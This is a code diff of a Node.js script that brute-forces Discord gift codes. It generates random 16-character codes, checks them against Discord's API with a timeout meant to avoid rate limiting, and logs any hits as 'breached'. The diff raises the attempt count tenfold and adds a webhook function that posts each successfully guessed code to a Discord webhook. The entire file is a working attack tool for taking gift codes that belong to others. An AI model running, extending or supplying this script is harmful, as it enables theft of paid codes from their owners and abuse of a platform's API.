@@ -1,10 +1,25 @@
 const fs = require('fs');
 const request = require('request');
 const giftLength = 16; //Current code length for disord gifts
-const amount = 100000; //Amount of generated and validated codes
+const amount = 1000000; //Amount of generated and validated codes
 const timeout = 5000; //Timeout in ms to prevent discord api ratelimiting
 const path = "./gifts.txt";
 var index = 0;
+const webhookId = '';
+const webhookToken = '';
+const url = `https://discordapp.com/api/webhooks/${webhookId}/${webhookToken}`;
+
+function sendMessage(message){
+
+	const data = {
+		content: message
+	}
+
+	request.post({url: url, form: data}, (err, res, body) => {
+		if(err) throw err;
+	});
+}
+
 
 function gen(length) {
    let result = '';
@@ -23,6 +38,7 @@ function validate() {
 		request(url, (error, response, body) => {
 			let json = JSON.parse(body);
 			if(json.message !== "Unknown Gift Code"){
+				sendMessage(`[ ${index} ] Successfully breached gift code! [ ${code} ] - ${url}`);
 				fs.appendFile(path, `[ ${index} ] Successfully breached gift code! [ ${code} ] - ${url}`, (err) => {
 					if (err) throw err;
 				});
@@ -34,4 +50,3 @@ function validate() {
 }
 
 validate();
-
